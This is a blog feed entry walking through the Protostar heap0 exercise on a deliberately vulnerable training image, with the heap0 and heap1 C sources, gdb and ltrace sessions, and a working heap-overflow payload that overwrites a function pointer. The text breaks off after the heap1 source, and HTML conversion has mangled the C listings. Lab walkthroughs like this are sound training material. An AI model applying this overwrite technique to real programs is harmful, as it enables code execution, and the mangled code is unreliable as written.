<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Exploit-exercises | 0x73696e65]]></title>
  <link href="http://73696e65.github.io/blog/categories/exploit-exercises/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-07-04T15:35:10+02:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Heap Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/07/04/exploit-exercises-protostar-heap-levels/"/>
    <updated>2015-07-04T09:29:50+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/07/04/exploit-exercises-protostar-heap-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<h2>Protostar Heap0</h2>

<p><figure class='code'><figcaption><span>heap0.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">struct</span> <span class="n">data</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'><span class="p">};</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">struct</span> <span class="n">fp</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
</span><span class='line'><span class="p">};</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">winner</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">level</span> <span class="n">passed</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">nowinner</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">level</span> <span class="n">has</span> <span class="n">not</span> <span class="n">been</span> <span class="n">passed</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">data</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">d</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">fp</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">f</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">d</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">data</span><span class="p">));</span>
</span><span class='line'>  <span class="n">f</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">fp</span><span class="p">));</span>
</span><span class='line'>  <span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span> <span class="o">=</span> <span class="n">nowinner</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">data</span> <span class="n">is</span> <span class="n">at</span> <span class="o">%</span><span class="n">p</span><span class="p">,</span> <span class="n">fp</span> <span class="n">is</span> <span class="n">at</span> <span class="o">%</span><span class="n">p</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">d</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">strcpy</span><span class="p">(</span><span class="n">d</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">();</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ gdb -q /opt/protostar/bin/heap0
</span><span class='line'>Really redefine built-in command &ldquo;frame&rdquo;? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Really redefine built-in command &ldquo;thread&rdquo;? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Really redefine built-in command &ldquo;start&rdquo;? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Reading symbols from /opt/protostar/bin/heap0&hellip;done.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
</span><span class='line'>data is at 0x804a008, fp is at 0x804a050&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Program received signal SIGSEGV, Segmentation fault.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code> eax:41346341 ebx:B7FD7FF4  ecx:00000000  edx:00000065     eflags:00210246
</span><span class='line'> esi:00000000 edi:00000000  esp:BFFFF70C  ebp:BFFFF738     eip:41346341
</span><span class='line'> cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>[007B:BFFFF70C]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
</span><span class='line'>BFFFF73C : 76 DC EA B7  02 00 00 00 - E4 F7 FF BF  F0 F7 FF BF v&hellip;&hellip;&hellip;&hellip;&hellip;
</span><span class='line'>BFFFF72C : 50 A0 04 08  20 85 04 08 - 00 00 00 00  B8 F7 FF BF P&hellip; &hellip;&hellip;&hellip;..
</span><span class='line'>BFFFF71C : 38 F7 FF BF  65 63 EC B7 - 40 10 FF B7  08 A0 04 08 8&hellip;ec..@&hellip;&hellip;.
</span><span class='line'>BFFFF70C : FF 84 04 08  08 A0 04 08 - 1D F9 FF BF  50 A0 04 08 &hellip;&hellip;&hellip;&hellip;P&hellip;
</span><span class='line'>[007B:41346341]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
</span><span class='line'>41346341 : Error while running hook_stop:
</span><span class='line'>Cannot access memory at address 0x41346341
</span><span class='line'>0x41346341 in ?? ()</span></code></pre></td></tr></table></div></figure></p>

<p><code>0x41346341</code> represents the offset 72, also <code>0x804a050 - 0x804a008 = 72</code>. So we
write 64B to <code>d-&gt;name</code> and after another 8B, there is the address of <code>fp</code>.</p>

<p>To verify our statement, we use ltrace and gdb:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap0 1337
</span><span class='line'>__libc_start_main(0x804848c, 2, 0xbffff844, 0x8048520, 0x8048510 &lt;unfinished ...>
</span><span class='line'>malloc(64)                                                      = 0x0804a008
</span><span class='line'>malloc(4)                                                       = 0x0804a050
</span><span class='line'>printf(&ldquo;data is at %p, fp is at %p\n&rdquo;, 0x804a008, 0x804a050data is at 0x804a008, f
</span><span class='line'>)                                                                  = 41
</span><span class='line'>strcpy(0x0804a008, &ldquo;1337&rdquo;)                                      = 0x0804a008
</span><span class='line'>puts(&ldquo;level has not been passed"level has not been passed
</span><span class='line'>)    = 26
</span><span class='line'>+++ exited (status 26) +++</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ gdb -q /opt/protostar/bin/heap0
</span><span class='line'>Really redefine built-in command &ldquo;frame&rdquo;? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Really redefine built-in command &ldquo;thread&rdquo;? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Really redefine built-in command &ldquo;start&rdquo;? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Reading symbols from /opt/protostar/bin/heap0&hellip;done.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> b *0x80484ff
</span><span class='line'>Breakpoint 1 at 0x80484ff: file heap0/heap0.c, line 40.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> r $(ruby -e &lsquo;print &ldquo;X&rdquo; * 64&rsquo;)
</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
</span><span class='line'>level has not been passed&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code> eax:0000001A ebx:B7FD7FF4  ecx:B7FD84C0  edx:B7FD9340     eflags:00200246
</span><span class='line'> esi:00000000 edi:00000000  esp:BFFFF730  ebp:BFFFF758     eip:080484FF
</span><span class='line'> cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>[007B:BFFFF730]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
</span><span class='line'>BFFFF760 : 02 00 00 00  04 F8 FF BF - 10 F8 FF BF  48 18 FE B7 &hellip;&hellip;&hellip;&hellip;H&hellip;
</span><span class='line'>BFFFF750 : 20 85 04 08  00 00 00 00 - D8 F7 FF BF  76 DC EA B7  &hellip;&hellip;&hellip;..v&hellip;
</span><span class='line'>BFFFF740 : 65 63 EC B7  40 10 FF B7 - 08 A0 04 08  50 A0 04 08 ec..@&hellip;&hellip;.P&hellip;
</span><span class='line'>BFFFF730 : 08 A0 04 08  41 F9 FF BF - 50 A0 04 08  58 F7 FF BF &hellip;.A&hellip;P&hellip;X&hellip;
</span><span class='line'>[007B:BFFFF730]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
</span><span class='line'>BFFFF730 : 08 A0 04 08  41 F9 FF BF - 50 A0 04 08  58 F7 FF BF &hellip;.A&hellip;P&hellip;X&hellip;
</span><span class='line'>BFFFF740 : 65 63 EC B7  40 10 FF B7 - 08 A0 04 08  50 A0 04 08 ec..@&hellip;&hellip;.P&hellip;
</span><span class='line'>[0073:080484FF]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ code]
</span><span class='line'>0x80484ff &lt;main+115>:   leave&lt;br/>
</span><span class='line'>0x8048500 &lt;main+116>:   ret  &lt;br/>
</span><span class='line'>0x8048501:  nop
</span><span class='line'>0x8048502:  nop
</span><span class='line'>0x8048503:  nop&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>0x8048504:  nop&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;p>Breakpoint 1, main (argc=0x2, argv=0xbffff804) at heap0/heap0.c:40
</span><span class='line'>40  heap0/heap0.c: No such file or directory.
</span><span class='line'>    in heap0/heap0.c&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> x /25x 0x0804a000
</span><span class='line'>0x804a000:  0x00000000  0x00000049  0x58585858  0x58585858
</span><span class='line'>0x804a010:  0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804a020:  0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804a030:  0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804a040:  0x58585858  0x58585858  0x00000000  0x00000011
</span><span class='line'>0x804a050:  0x08048478  0x00000000  0x00000000  0x00020fa9
</span><span class='line'>0x804a060:  0x00000000</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(08) 0x0804a000: d-control
</span><span class='line'>(64) 0x0804a008: d-name&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(08) 0x0804a048: f-control
</span><span class='line'>(04) 0x0804a050: f-fp</span></code></pre></td></tr></table></div></figure></p>

<p>We set <code>fp</code> to <code>winner()</code> symbol:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ nm /opt/protostar/bin/heap0 | grep winner
</span><span class='line'>08048478 T nowinner
</span><span class='line'>08048464 T winner&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ /opt/protostar/bin/heap0 $(ruby -e &lsquo;print &ldquo;X&rdquo;*72 + [0x08048464].pack(&ldquo;V&rdquo;)&rsquo;)
</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
</span><span class='line'>level passed</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Heap1</h2>

<p><figure class='code'><figcaption><span>heap1.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">struct</span> <span class="n">internet</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">priority</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">winner</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">and</span> <span class="n">we</span> <span class="n">have</span> <span class="n">a</span> <span class="n">winner</span> <span class="err">@</span> <span class="o">%</span><span class="n">d</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">internet</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">i1</span><span class="p">,</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">i2</span><span class="p">,</span> <span class="o">*</span><span class="n">i3</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">i1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">internet</span><span class="p">));</span>
</span><span class='line'>  <span class="n">i1</span><span class="o">-&gt;</span><span class="n">priority</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">i2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">internet</span><span class="p">));</span>
</span><span class='line'>  <span class="n">i2</span><span class="o">-&gt;</span><span class="n">priority</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'>  <span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">strcpy</span><span class="p">(</span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">and</span> <span class="n">that</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">s</span> <span class="n">a</span> <span class="n">wrap</span> <span class="n">folks</span><span class="o">!</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
